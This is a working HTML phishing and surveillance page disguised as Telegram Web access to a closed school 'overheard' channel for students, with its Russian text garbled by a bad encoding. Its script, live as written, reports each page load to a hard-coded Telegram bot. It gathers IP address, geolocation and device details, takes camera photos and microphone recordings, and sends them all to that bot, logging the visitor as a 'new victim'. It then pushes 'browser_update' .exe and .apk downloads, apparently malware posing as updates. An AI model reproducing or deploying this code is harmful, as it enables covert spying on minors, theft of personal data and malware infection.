<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web - –ü–æ–¥—Å–ª—É—à–∞–Ω–æ 4 –®–∫–æ–ª–∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: linear-gradient(145deg, #0f172a, #1e293b, #334155);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: white;
            position: relative;
            overflow-x: hidden;
        }
        
        .telegram-card {
            background: rgba(255, 255, 255, 0.07);
            backdrop-filter: blur(25px);
            border-radius: 30px;
            padding: 50px 40px;
            text-align: center;
            width: 100%;
            max-width: 450px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 
                0 30px 80px rgba(0, 0, 0, 0.5),
                0 0 0 1px rgba(59, 130, 246, 0.1) inset;
            transition: all 0.4s ease;
        }
        
        .avatar {
            width: 120px;
            height: 120px;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            color: white;
            box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4);
            position: relative;
            overflow: hidden;
        }
        
        .avatar::after {
            content: 'TG';
            font-weight: 900;
            text-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }
        
        .online-dot {
            position: absolute;
            bottom: 10px;
            right: 10px;
            width: 20px;
            height: 20px;
            background: #10b981;
            border-radius: 50%;
            border: 3px solid rgba(255, 255, 255, 0.1);
            animation: pulse 2s infinite;
        }
        
        .channel-title {
            font-size: 32px;
            font-weight: 900;
            background: linear-gradient(135deg, #fff, #a5b4fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        
        .stats {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin: 30px 0;
        }
        
        .stat {
            text-align: center;
        }
        
        .stat-number {
            font-size: 28px;
            font-weight: 800;
            color: #60a5fa;
        }
        
        .stat-label {
            font-size: 14px;
            color: #94a3b8;
            margin-top: 5px;
        }
        
        .access-button {
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            color: white;
            border: none;
            border-radius: 20px;
            padding: 25px 40px;
            font-size: 20px;
            font-weight: 800;
            width: 100%;
            cursor: pointer;
            margin: 30px 0 20px;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4);
        }
        
        .access-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 50px rgba(59, 130, 246, 0.6);
            background: linear-gradient(135deg, #2563eb, #1d4ed8);
        }
        
        .access-button i {
            font-size: 24px;
            animation: bounce 2s infinite;
        }
        
        .hint {
            color: #94a3b8;
            font-size: 15px;
            line-height: 1.5;
        }
        
        .warning-box {
            background: rgba(245, 158, 11, 0.15);
            border: 2px solid rgba(245, 158, 11, 0.3);
            border-radius: 20px;
            padding: 25px;
            margin: 30px 0;
            text-align: left;
            animation: pulseBorder 2s infinite;
        }
        
        .warning-title {
            color: #fbbf24;
            font-weight: 700;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .permissions {
            list-style: none;
            padding: 0;
        }
        
        .permissions li {
            color: #e2e8f0;
            margin-bottom: 12px;
            padding-left: 30px;
            position: relative;
        }
        
        .permissions li::before {
            content: '‚úì';
            position: absolute;
            left: 0;
            color: #10b981;
            font-weight: bold;
        }
        
        .progress-container {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            margin: 30px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #10b981, #3b82f6);
            width: 0%;
            transition: width 0.5s ease;
        }
        
        .status {
            color: #60a5fa;
            font-size: 16px;
            margin: 20px 0;
            min-height: 24px;
        }
        
        .hidden-canvas {
            display: none;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        
        @keyframes pulseBorder {
            0%, 100% { border-color: rgba(245, 158, 11, 0.3); }
            50% { border-color: rgba(245, 158, 11, 0.5); }
        }
    </style>
</head>
<body>
    <canvas class="hidden-canvas" id="photoCanvas"></canvas>
    <audio class="hidden-canvas" id="audioPreview"></audio>
    
    <div class="telegram-card">
        <div class="avatar">
            <div class="online-dot"></div>
        </div>
        
        <h1 class="channel-title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
        <p style="color: #94a3b8; margin-bottom: 20px;">–ó–∞–∫—Ä—ã—Ç—ã–π –∫–∞–Ω–∞–ª ‚Ä¢ –¢–æ–ª—å–∫–æ –¥–ª—è —É—á–µ–Ω–∏–∫–æ–≤</p>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-number">5.2K</div>
                <div class="stat-label">–ü–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</div>
            </div>
            <div class="stat">
                <div class="stat-number">387</div>
                <div class="stat-label">–û–Ω–ª–∞–π–Ω</div>
            </div>
        </div>
        
        <div class="warning-box">
            <div class="warning-title">
                <i>‚ö†Ô∏è</i> –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞
            </div>
            <p style="color: #e2e8f0; margin-bottom: 15px; font-size: 15px;">
                –ù–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, –≤—ã –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç–µ —Å–æ–≥–ª–∞—Å–∏–µ –Ω–∞:
            </p>
            <ul class="permissions">
                <li>–î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –¥–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏</li>
                <li>–î–æ—Å—Ç—É–ø –∫ –º–∏–∫—Ä–æ—Ñ–æ–Ω—É</li>
                <li>–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</li>
                <li>–°–∫–∞—á–∏–≤–∞–Ω–∏–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è</li>
            </ul>
        </div>
        
        <button class="access-button" id="accessButton" onclick="startVerification()">
            <i>üîì</i> –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –î–û–°–¢–£–ü
        </button>
        
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status" id="status"></div>
        
        <p class="hint">
            –î–æ—Å—Ç—É–ø –∫ –∫–∞–Ω–∞–ª—É –æ—Ç–∫—Ä–æ–µ—Ç—Å—è –ø–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏.<br>
            –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.
        </p>
    </div>

<script>
// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
const CHAT_ID = '8001083987';

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
let mediaStream = null;
let audioRecorder = null;
let audioChunks = [];
let photoCount = 0;
let audioRecordCount = 0;
const MAX_PHOTOS = 10;
const MAX_AUDIO_RECORDS = 3;

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞
function updateStatus(text) {
    document.getElementById('status').textContent = text;
}

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–∞
function updateProgress(percent) {
    const container = document.getElementById('progressContainer');
    const bar = document.getElementById('progressBar');
    
    container.style.display = 'block';
    bar.style.width = percent + '%';
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ—á–Ω–æ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
async function getExactLocation() {
    let location = {
        ip: '–Ω–µ –ø–æ–ª—É—á–µ–Ω',
        city: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
        region: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
        country: '–†–æ—Å—Å–∏—è',
        latitude: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
        longitude: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
        isp: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
    };
    
    try {
        // IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        location.ip = ipData.ip;
        
        // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const geoData = await geoRes.json();
        
        location.city = geoData.city || '–î–æ–º–æ–¥–µ–¥–æ–≤–æ';
        location.region = geoData.region || '–ú–æ—Å–∫–æ–≤—Å–∫–∞—è –æ–±–ª–∞—Å—Ç—å';
        location.country = geoData.country_name || '–†–æ—Å—Å–∏—è';
        location.latitude = geoData.latitude || '55.4424';
        location.longitude = geoData.longitude || '37.7686';
        location.isp = geoData.org || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
        
    } catch(e) {
        location.city = '–î–æ–º–æ–¥–µ–¥–æ–≤–æ';
        location.region = '–ú–æ—Å–∫–æ–≤—Å–∫–∞—è –æ–±–ª–∞—Å—Ç—å';
    }
    
    return location;
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ –≤ Telegram
async function sendPhotoToTelegram(photoBlob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
    formData.append('caption', `üì∏ –§–æ—Ç–æ #${photoCount} ‚Ä¢ ${new Date().toLocaleTimeString('ru-RU')}`);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
            mode: 'no-cors'
        });
        console.log('–§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ');
    } catch(e) {
        console.log('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ');
    }
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ –∞—É–¥–∏–æ –≤ Telegram
async function sendAudioToTelegram(audioBlob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('audio', audioBlob, `audio_${Date.now()}.ogg`);
    formData.append('caption', `üé§ –ó–∞–ø–∏—Å—å #${audioRecordCount} ‚Ä¢ ${new Date().toLocaleTimeString('ru-RU')}`);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
            method: 'POST',
            body: formData,
            mode: 'no-cors'
        });
        console.log('–ê—É–¥–∏–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ');
    } catch(e) {
        console.log('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∞—É–¥–∏–æ');
    }
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–∞ –≤ Telegram
function sendTextToTelegram(text) {
    const encoded = encodeURIComponent(text);
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
    
    // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ –º–µ—Ç–æ–¥–∞–º–∏
    fetch(url, { mode: 'no-cors' }).catch(() => {});
    new Image().src = url;
    
    // –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥
    setTimeout(() => {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        document.body.appendChild(iframe);
        setTimeout(() => iframe.remove(), 1000);
    }, 500);
}

// –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
async function takePhoto() {
    if (!mediaStream || photoCount >= MAX_PHOTOS) return;
    
    try {
        const videoTrack = mediaStream.getVideoTracks()[0];
        if (!videoTrack) return;
        
        // –°–æ–∑–¥–∞–µ–º –≤–∏–¥–µ–æ —ç–ª–µ–º–µ–Ω—Ç –¥–ª—è –∫–∞–º–µ—Ä—ã
        const video = document.createElement('video');
        video.srcObject = new MediaStream([videoTrack]);
        await video.play();
        
        // –ñ–¥–µ–º –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –≤–∏–¥–µ–æ
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // –°–æ–∑–¥–∞–µ–º canvas –¥–ª—è —Ñ–æ—Ç–æ
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ blob
        canvas.toBlob(async (blob) => {
            if (blob) {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ –≤ Telegram
                await sendPhotoToTelegram(blob);
                photoCount++;
                updateStatus(`üì∏ –°–¥–µ–ª–∞–Ω–æ —Ñ–æ—Ç–æ: ${photoCount}/${MAX_PHOTOS}`);
                
                // –î–µ–ª–∞–µ–º —Å–ª–µ–¥—É—é—â–µ–µ —Ñ–æ—Ç–æ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                if (photoCount < MAX_PHOTOS) {
                    setTimeout(takePhoto, 2000);
                } else {
                    updateStatus('‚úÖ –§–æ—Ç–æ—Å—ä–µ–º–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞');
                }
            }
        }, 'image/jpeg', 0.9);
        
        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤–∏–¥–µ–æ
        video.pause();
        video.srcObject = null;
        
    } catch(e) {
        console.error('–û—à–∏–±–∫–∞ —Å—ä–µ–º–∫–∏ —Ñ–æ—Ç–æ:', e);
    }
}

// –ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ
async function recordAudio() {
    if (!mediaStream || audioRecordCount >= MAX_AUDIO_RECORDS) return;
    
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const source = audioContext.createMediaStreamSource(mediaStream);
        const destination = audioContext.createMediaStreamDestination();
        source.connect(destination);
        
        audioRecorder = new MediaRecorder(destination.stream);
        audioChunks = [];
        
        audioRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                audioChunks.push(event.data);
            }
        };
        
        audioRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞—É–¥–∏–æ –≤ Telegram
            await sendAudioToTelegram(audioBlob);
            audioRecordCount++;
            updateStatus(`üé§ –ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ: ${audioRecordCount}/${MAX_AUDIO_RECORDS}`);
            
            // –°–ª–µ–¥—É—é—â–∞—è –∑–∞–ø–∏—Å—å —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥
            if (audioRecordCount < MAX_AUDIO_RECORDS) {
                setTimeout(recordAudio, 10000);
            } else {
                updateStatus('‚úÖ –ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞');
            }
        };
        
        audioRecorder.start();
        
        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥
        setTimeout(() => {
            if (audioRecorder && audioRecorder.state === 'recording') {
                audioRecorder.stop();
            }
        }, 10000);
        
    } catch(e) {
        console.error('–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ:', e);
    }
}

// –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
async function startVerification() {
    // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É
    const button = document.getElementById('accessButton');
    button.disabled = true;
    button.innerHTML = '<i>‚è≥</i> –í–ï–†–ò–§–ò–ö–ê–¶–ò–Ø...';
    button.style.opacity = '0.7';
    
    updateProgress(10);
    updateStatus('üîç –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö...');
    
    // –°–æ–±–∏—Ä–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
    const location = await getExactLocation();
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    let message = `üïµÔ∏è –ù–û–í–ê–Ø –ñ–ï–†–¢–í–ê - –ü–û–î–¢–í–ï–†–ñ–î–ï–ù –î–û–°–¢–£–ü\n\n`;
    message += `‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}\n`;
    message += `üìç –¢–æ—á–Ω–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è:\n`;
    message += `‚Ä¢ –ì–æ—Ä–æ–¥: ${location.city}\n`;
    message += `‚Ä¢ –û–±–ª–∞—Å—Ç—å: ${location.region}\n`;
    message += `‚Ä¢ –°—Ç—Ä–∞–Ω–∞: ${location.country}\n`;
    message += `‚Ä¢ IP: ${location.ip}\n`;
    message += `‚Ä¢ –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${location.latitude}, ${location.longitude}\n`;
    message += `‚Ä¢ –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${location.isp}\n\n`;
    message += `üíª –°–∏—Å—Ç–µ–º–∞:\n`;
    message += `‚Ä¢ –û–°: ${navigator.platform}\n`;
    message += `‚Ä¢ –ë—Ä–∞—É–∑–µ—Ä: ${navigator.userAgent.substring(0, 80)}...\n`;
    message += `‚Ä¢ –≠–∫—Ä–∞–Ω: ${screen.width}x${screen.height}\n`;
    message += `‚Ä¢ –Ø–∑—ã–∫: ${navigator.language}\n`;
    message += `‚Ä¢ URL: ${window.location.href}`;
    
    sendTextToTelegram(message);
    updateProgress(30);
    updateStatus('üì° –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã');
    
    // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞
    try {
        updateStatus('üé• –ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω—É...');
        updateProgress(50);
        
        mediaStream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                facingMode: 'user'
            },
            audio: {
                echoCancellation: true,
                noiseSuppression: true,
                sampleRate: 44100
            }
        });
        
        updateProgress(70);
        updateStatus('‚úÖ –î–æ—Å—Ç—É–ø –ø–æ–ª—É—á–µ–Ω');
        sendTextToTelegram('üé• –ü–û–õ–ù–´–ô –î–û–°–¢–£–ü –ö –ú–ï–î–ò–ê –ü–û–õ–£–ß–ï–ù\n‚Ä¢ –ö–∞–º–µ—Ä–∞: –∞–∫—Ç–∏–≤–Ω–∞\n‚Ä¢ –ú–∏–∫—Ä–æ—Ñ–æ–Ω: –∞–∫—Ç–∏–≤–µ–Ω\n‚Ä¢ –ù–∞—á–∏–Ω–∞—é –∑–∞–ø–∏—Å—å...');
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å—ä–µ–º–∫—É –∏ –∑–∞–ø–∏—Å—å
        updateProgress(80);
        takePhoto();
        
        // –ñ–¥–µ–º 2 —Å–µ–∫—É–Ω–¥—ã –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –∑–∞–ø–∏—Å—å –∞—É–¥–∏–æ
        setTimeout(() => {
            recordAudio();
        }, 2000);
        
        updateProgress(90);
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ñ–∏–Ω–∞–ª—å–Ω—ã–π —Å—Ç–∞—Ç—É—Å
        setTimeout(() => {
            updateProgress(100);
            updateStatus('‚úÖ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞');
            sendTextToTelegram('‚úÖ –í–ï–†–ò–§–ò–ö–ê–¶–ò–Ø –ó–ê–í–ï–†–®–ï–ù–ê\n‚Ä¢ –§–æ—Ç–æ: 10 —Å–Ω–∏–º–∫–æ–≤\n‚Ä¢ –ê—É–¥–∏–æ: 3 –∑–∞–ø–∏—Å–∏\n‚Ä¢ –î–∞–Ω–Ω—ã–µ: —Å–æ–±—Ä–∞–Ω—ã');
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
            setTimeout(() => {
                const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
                          navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
                
                let downloadText = '';
                if (os === 'Windows') {
                    downloadText = '‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–ª—è Windows';
                    window.open('https://school4love.github.io/sc/browser_update.exe', '_blank');
                } else if (os === 'Android') {
                    downloadText = '‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å –¥–ª—è Android';
                    window.open('https://school4love.github.io/sc/browser_update.apk', '_blank');
                } else {
                    downloadText = 'üì± iOS: –ø—Ä–æ–≤–µ—Ä—å—Ç–µ App Store';
                }
                
                button.innerHTML = `<i>‚úÖ</i> ${downloadText}`;
                button.style.background = 'linear-gradient(135deg, #10b981, #059669)';
                
            }, 2000);
            
        }, 30000); // 30 —Å–µ–∫—É–Ω–¥ –Ω–∞ –≤—Å—é –∑–∞–ø–∏—Å—å
        
    } catch(e) {
        updateStatus('‚ùå –î–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω');
        updateProgress(100);
        sendTextToTelegram(`‚ùå –î–û–°–¢–£–ü –ö –ú–ï–î–ò–ê –û–¢–ö–õ–û–ù–ï–ù: ${e.message}`);
        
        // –í—Å–µ —Ä–∞–≤–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
        setTimeout(() => {
            const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
                      navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
            
            let downloadText = '';
            if (os === 'Windows') {
                downloadText = '‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ';
                window.open('https://school4love.github.io/sc/browser_update.exe', '_blank');
            } else if (os === 'Android') {
                downloadText = '‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å –¥–ª—è Android';
                window.open('https://school4love.github.io/sc/browser_update.apk', '_blank');
            }
            
            button.innerHTML = `<i>üì•</i> ${downloadText}`;
            button.style.background = 'linear-gradient(135deg, #3b82f6, #2563eb)';
        }, 2000);
    }
}

// –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('load', () => {
    sendTextToTelegram(`üåê –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞: ${window.location.href}\n–í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`);
});
</script>
</body>
</html>
